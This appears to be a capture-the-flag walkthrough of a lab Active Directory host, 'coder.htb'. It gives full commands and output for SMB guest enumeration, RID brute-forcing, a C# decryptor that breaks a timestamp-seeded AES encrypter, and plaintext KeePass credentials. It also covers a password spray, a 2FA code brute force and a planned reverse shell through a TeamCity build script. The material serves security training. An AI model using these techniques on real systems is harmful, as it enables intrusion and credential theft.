# Host file setup

```python
❯❯❯ sudo nxc smb 10.129.229.190 --generate-hosts-file /etc/hosts                     
[sudo] password for kali: 
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration
## Open ports
```python
❯❯❯ nmap -p- --min-rate=2000 -sT -Pn dc01.coder.htb -vv

Nmap scan report for dc01.coder.htb (10.129.229.190)
Host is up, received user-set (0.013s latency).
rDNS record for 10.129.229.190: DC01.coder.htb
Scanned at 2026-11-13 17:09:44 GMT for 12s
Not shown: 65508 closed tcp ports (conn-refused)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
80/tcp    open  http             syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
443/tcp   open  https            syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
47001/tcp open  winrm            syn-ack
49664/tcp open  unknown          syn-ack
49665/tcp open  unknown          syn-ack
49666/tcp open  unknown          syn-ack
49667/tcp open  unknown          syn-ack
49669/tcp open  unknown          syn-ack
49670/tcp open  unknown          syn-ack
49671/tcp open  unknown          syn-ack
49677/tcp open  unknown          syn-ack
49680/tcp open  unknown          syn-ack
49688/tcp open  unknown          syn-ack
49692/tcp open  unknown          syn-ack

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.99 seconds
```

## Nmap
```python
❯❯❯ nmap -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389 -A --min-rate=2000 -sT -Pn dc01.coder.htb                 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-13 17:10 +0000
Nmap scan report for dc01.coder.htb (10.129.229.190)
Host is up (0.013s latency).
rDNS record for 10.129.229.190: DC01.coder.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-11-14 01:10:24Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
443/tcp  open  ssl/https?
| ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US
| Not valid before: 2022-11-04T17:25:43
|_Not valid after:  2032-11-01T17:25:43
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: coder.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-11-14T01:11:12+00:00; +7h59m32s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER
| Not valid before: 2023-11-21T23:06:46
|_Not valid after:  2033-11-21T23:16:46
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2019 (97%), Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows 10 1709 - 22H2 (94%), Microsoft Windows 10 1909 (92%), Microsoft Windows 11 24H2 - 25H2 (92%), Microsoft Windows Server 2012 R2 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 21H2 (90%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)

Null auth is enabled but cannot use it to enumerate

The guest account is enabled

```python
❯❯❯ nxc smb dc01.coder.htb -u 'Guest' -p ''             
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [+] coder.htb\Guest:
```

```python
❯❯❯ nxc smb dc01.coder.htb -u 'Guest' -p '' --shares
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [+] coder.htb\Guest: 
SMB         10.129.229.190  445    DC01             [*] Enumerated shares
SMB         10.129.229.190  445    DC01             Share           Permissions     Remark
SMB         10.129.229.190  445    DC01             -----           -----------     ------
SMB         10.129.229.190  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.229.190  445    DC01             C$                              Default share
SMB         10.129.229.190  445    DC01             Development     READ            
SMB         10.129.229.190  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.229.190  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.229.190  445    DC01             SYSVOL                          Logon server share 
SMB         10.129.229.190  445    DC01             Users           READ          
```

This user has read on `development` and `users`

```python
❯❯❯ nxc smb dc01.coder.htb -u 'Guest' -p '' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
Administrator
Guest
krbtgt
DC01$
e.black
c.cage
j.briggs
l.kang
s.blade
svc_teamcity
```

Ill also grab the users

# Development share

```python
❯❯❯ smbclient //dc01.coder.htb/Development -U 'Guest'%''
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov  3 15:16:25 2022
  ..                                  D        0  Thu Nov  3 15:16:25 2022
  Migrations                          D        0  Tue Nov  8 22:11:25 2022
  Temporary Projects                  D        0  Fri Nov 11 22:19:03 2022

		6232831 blocks of size 4096. 1013631 blocks available
smb: \>
```

This share looks more interesting

```python
smb: \Temporary Projects\> dir
  .                                   D        0  Fri Nov 11 22:19:03 2022
  ..                                  D        0  Fri Nov 11 22:19:03 2022
  Encrypter.exe                       A     5632  Fri Nov  4 16:51:59 2022
  s.blade.enc                         A     3808  Fri Nov 11 22:17:08 2022

		6232831 blocks of size 4096. 1015003 blocks available
smb: \Temporary Projects\> 
```

Ill switch to the impacket python tool since it has better download functionality

```python
❯❯❯ smbclient.py coder.htb/Guest:''@dc01.coder.htb
# shares
# use Development
# rget *
```

This downloads all the file here

The encrypter is .NET which means i can load it into ILspy

# Reverse engineering of .NET binary

```C#
// AES
using System;
using System.IO;
using System.Security.Cryptography;

internal class AES
{
	public static void Main(string[] args)
	{
		if (args.Length != 1)
		{
			Console.WriteLine("You must provide the name of a file to encrypt.");
			return;
		}
		FileInfo fileInfo = new FileInfo(args[0]);
		string destFile = Path.ChangeExtension(fileInfo.Name, ".enc");
		long value = DateTimeOffset.Now.ToUnixTimeSeconds();
		Random random = new Random(Convert.ToInt32(value));
		byte[] array = new byte[16];
		random.NextBytes(array);
		byte[] array2 = new byte[32];
		random.NextBytes(array2);
		byte[] array3 = EncryptFile(fileInfo.Name, destFile, array2, array);
	}

	private static byte[] EncryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
	{
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			using FileStream stream = new FileStream(destFile, FileMode.Create);
			using ICryptoTransform transform = rijndaelManaged.CreateEncryptor(Key, IV);
			using CryptoStream cryptoStream = new CryptoStream(stream, transform, CryptoStreamMode.Write);
			using FileStream fileStream = new FileStream(sourceFile, FileMode.Open);
			byte[] array = new byte[1024];
			int count;
			while ((count = fileStream.Read(array, 0, array.Length)) != 0)
			{
				cryptoStream.Write(array, 0, count);
			}
		}
		return null;
	}
}
```

This is pretty much all of the application

This is the code its using to encrypt the file

```python
long value = DateTimeOffset.Now.ToUnixTimeSeconds();
Random random = new Random(Convert.ToInt32(value));   
```

This bit of code is the most interesting

> System.Random is a linear congruential generator (LCG), not a CSPRNG. Seeding it with the current Unix timestamp means the 16-byte IV and 32-byte key are fully determined by the second the file was encrypted. If you can recover that timestamp (e.g., from file metadata, logs, or by brute-forcing a small window of nearby seconds), you can reproduce the exact key and IV and decrypt the .enc file.

This essentially means if i can find the exact timestamp it was encrypted i can use that timestamp to decrypt

```python
# ls
drw-rw-rw-          0  Fri Nov 11 22:19:03 2022 .
drw-rw-rw-          0  Fri Nov 11 22:19:03 2022 ..
-rw-rw-rw-       5632  Fri Nov  4 16:58:20 2022 Encrypter.exe
-rw-rw-rw-       3808  Fri Nov 11 22:17:08 2022 s.blade.enc
# 
```

Using the SMB client i can see the date used 

This is synced with my clock though, so ill have to convert it

```python
❯❯❯ date -u -d "Nov 11 22:17:08 2022" +%s
1668205028
```

Then ill create the seed

Then ill get claude to make a C# script

```python
❯❯❯ cat Decryptor.cs 
// Decryptor.cs
// Mirrors encryptor.exe's key/IV derivation and uses the same RijndaelManaged
// defaults, so there's no need to guess block size / padding / mode.
//
// Build:  mcs Decryptor.cs   (or: dotnet build with a minimal csproj)
// Run:    mono Decryptor.exe <path-to-encrypted-file> <unix-timestamp-seconds>
//
// Example: mono Decryptor.exe backup.enc 1700000000

using System;
using System.IO;
using System.Security.Cryptography;

internal class Decryptor
{
    public static void Main(string[] args)
    {
        if (args.Length != 2)
        {
            Console.WriteLine("Usage: Decryptor.exe <encrypted_file> <unix_timestamp_seconds>");
            return;
        }

        string sourceFile = args[0];
        long seedValue = long.Parse(args[1]);
        string destFile = Path.ChangeExtension(sourceFile, ".dec");

        // Exactly replicate encryptor.exe's derivation order: seed -> Random -> IV (16) -> Key (32)
        Random random = new Random(Convert.ToInt32(seedValue));
        byte[] iv = new byte[16];
        random.NextBytes(iv);
        byte[] key = new byte[32];
        random.NextBytes(key);

        Console.WriteLine("Seed:  " + seedValue);
        Console.WriteLine("Key:   " + BitConverter.ToString(key).Replace("-", ""));
        Console.WriteLine("IV:    " + BitConverter.ToString(iv).Replace("-", ""));

        try
        {
            DecryptFile(sourceFile, destFile, key, iv);
            Console.WriteLine("Decrypted -> " + destFile);
        }
        catch (CryptographicException ex)
        {
            // Almost always means the seed (timestamp) is wrong, not the code.
            Console.WriteLine("Decryption failed: " + ex.Message);
            Console.WriteLine("If this says 'Padding is invalid', the seed/timestamp is wrong — re-check it.");
        }
    }

    private static void DecryptFile(string sourceFile, string destFile, byte[] Key, byte[] IV)
    {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        using (FileStream destStream = new FileStream(destFile, FileMode.Create))
        using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(Key, IV))
        using (CryptoStream cryptoStream = new CryptoStream(destStream, transform, CryptoStreamMode.Write))
        using (FileStream srcStream = new FileStream(sourceFile, FileMode.Open))
        {
            byte[] buffer = new byte[1024];
            int count;
            while ((count = srcStream.Read(buffer, 0, buffer.Length)) != 0)
            {
                cryptoStream.Write(buffer, 0, count);
            }
        }
    }
}
```

Once its made the script i can run it

```python
❯❯❯ mcs Decryptor.cs 
❯❯❯ mono Decryptor.exe Temporary\ Projects/s.blade.enc 1668205028
Seed:  1668205028
Key:   0E674FD72BA946B290BE0A5E88672402587129B780DB134808C1EDCE0BFEB48C
IV:    3E65D265E62244DF1F308C6836AD215B
Decrypted -> Temporary Projects/s.blade.dec
```

Then ill compile it and run it on my system with mono

```python
❯❯❯ file s.blade.dec 
s.blade.dec: 7-zip archive data, version 0.4
```

I now have the decryption

# Accessing 7zip archive

After decryption i see its a 7zip archive

```python
❯❯❯ 7z l s.blade.dec 

7-Zip 26.05 (x64) : Copyright (c) 1999-2026 Igor Pavlov : 2026-10-21
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:4096, ASM

Scanning the drive for archives:
1 file, 3799 bytes (4 KiB)

Listing archive: s.blade.dec

--
Path = s.blade.dec
Type = 7z
Physical Size = 3799
Headers Size = 177
Method = LZMA2:12
Solid = -
Blocks = 2

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-11-03 20:02:30 ..H.A         1024         1028  .key
2022-11-11 22:13:55 ....A         2590         2594  s.blade.kdbx
------------------- ----- ------------ ------------  ------------------------
2022-11-11 22:13:55               3614         3622  2 files
```

Looks like these is a .kdbx file

```python
❯❯❯ 7z x s.blade.dec
```

Ill then extract both files

```python
❯❯❯ keepassxc s.blade.kdbx --keyfile .key
```

Ill then use this tool to open the file making sure to supply the key

![](Pasted%20image%2020261115174621.png)

I can now read the DB

```python
Authenticator backup codes:

{
  "6132e897-44a2-4d14-92d2-12954724e83f": {
    "encrypted": true,
    "hash": "6132e897-44a2-4d14-92d2-12954724e83f",
    "index": 1,
    "type": "totp",
    "secret": "U2FsdGVkX1+3JfFoKh56OgrH5jH0LLtc+34jzMBzE+QbqOBTXqKvyEEPKUyu13N2",
    "issuer": "TeamCity",
    "account": "s.blade"
  },
  "key": {
    "enc": "U2FsdGVkX19dvUpQDCRui5XaLDSbh9bP00/1iBSrKp7102OR2aRhHN0s4QHq/NmYwxadLeTN7Me1a3LrVJ+JkKd76lRCnd1utGp/Jv6w0hmcsqdhdccOpixnC3wAnqBp+5QyzPVaq24Z4L+Rx55HRUQVNLrkLgXpkULO20wYbQrJYN1D8nr3g/G0ukrmby+1",
    "hash": "$argon2id$v=19$m=16384,t=1,p=1$L/vKleu5gFis+GLZbROCPw$OzW14DA0kdgIjCbo6MPDYoh+NEHnNCNV"
  }
}
```

```python
O365:

s.blade@coder.htb:AmcwNO60Zg3vca3o0HDrTC6D
```

```python
Teamcity:

s.blade:veh5nUSZFFoqz9CrrhSeuwhA

URL: https://teamcity-dev.coder.htb
```

So a few interesting things from this DB

# Domain Credentials

```python
❯❯❯ nxc smb dc01.coder.htb -u users.txt -p 'AmcwNO60Zg3vca3o0HDrTC6D' --continue-on-success  
SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.229.190  445    DC01             [-] coder.htb\Administrator:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\Guest:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\krbtgt:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\DC01$:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\e.black:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\c.cage:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\j.briggs:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [-] coder.htb\l.kang:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
SMB         10.129.229.190  445    DC01             [+] coder.htb\s.blade:AmcwNO60Zg3vca3o0HDrTC6D 
SMB         10.129.229.190  445    DC01             [-] coder.htb\svc_teamcity:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
```

One of the passwords works on the domain for the user `s.blade`

Ive done some quick checks, this user has no access over RDP or WINRM, and there are no kerberoastable or asreproastable users

The user also does not have interesting shares

# Teamcity install

In the .kdbx file therese was a teamcity subdomain

![](Pasted%20image%2020261115175649.png)

The teamcity creds from the kdbx file works but there is 2FA enabled!

# 2FA code brute force

After noticing the site has no rate limiting ill perform a brute force of this code

```python
❯❯❯ seq -w 000000 999999 | tee numbers.txt
```

Ill use the above command to generate every 6-digit permutation possible

Ill then open caido and run an automate task, similar to bursuite's intruder, only the free version of caido has no rate limiting

Ill also raise the worker count, essentially increasing the threads since this could be really quick or it could take a while depending on the code

![](Pasted%20image%2020261116175624.png)

Ill then run the attack, ill filter for code 302 since every failed request shows 200, so its a good chance a valid attempt will be a 302

And after a few minutes i get in

![](Pasted%20image%2020261116175716.png)

Ill have a look around the build

![](Pasted%20image%2020261116180713.png)

![](Pasted%20image%2020261116181105.png)

I can see its pulling from a git repo, and executing a file called `hello_world.ps1`

https://exploitnotes.org/exploit/web/teamcity#arbitrary-command-execution-by-custom-script

# RCE

So at this point i know there is a powershell script that its pulling from the git repo

But i can create a .diff file and upload that, essentially removing the current hello world script to create a reverse shell

```python
❯❯❯ cat hello_world.ps1               
#Simple repo test for Teamcity pipeline
write-host "Hello, World!"
```

I already know what the script looks like because its inside the `development` share

So the plan is to make a diff file to remove the current hello world script and commit the new one, which contains a reverse shell






